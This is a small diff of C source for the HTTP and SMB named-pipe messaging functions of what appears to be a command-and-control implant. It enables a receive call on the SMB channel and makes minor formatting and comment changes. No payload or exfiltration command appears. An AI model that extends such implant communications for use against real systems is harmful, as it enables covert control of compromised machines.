@@ -95,7 +95,7 @@ BOOL NetworkHttpXSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
         with multi-threading there is a possibilty of gInternetConnect/gInternetOpen 
         handles being freed while they're being used in another thread.
     */
-    if (WaitForSingleObject(gHttpMutex, INFINITE) != WAIT_OBJECT_0)     // Locks 
+    if ( WaitForSingleObject(gHttpMutex, INFINITE) != WAIT_OBJECT_0 )     // Locks 
     {
         _dbg("WaitForSingleObject failed : ERROR %d", GetLastError());
     }
@@ -168,11 +168,18 @@ BOOL NetworkSmbSend(PPackage package, PBYTE* ppOutData, SIZE_T* pOutLen)
 {
     BOOL bStatus = FALSE;
 
-    /* Create named pipe server if does not exist */
+    /* Create/Write data to SMB Comms Channel */
     bStatus = SmbSend(package);
     
-    // bStatus = SmbReceive(ppOutData, pOutLen);
 
+    /* Wait/Read data from SMB Comms Channel */
+    bStatus = SmbRecieve(ppOutData, pOutLen);
+
+
+    // DEBUG
+    // *ppOutData = NULL;
+    // *pOutLen   = 0;
+    
     return bStatus;
 }
 
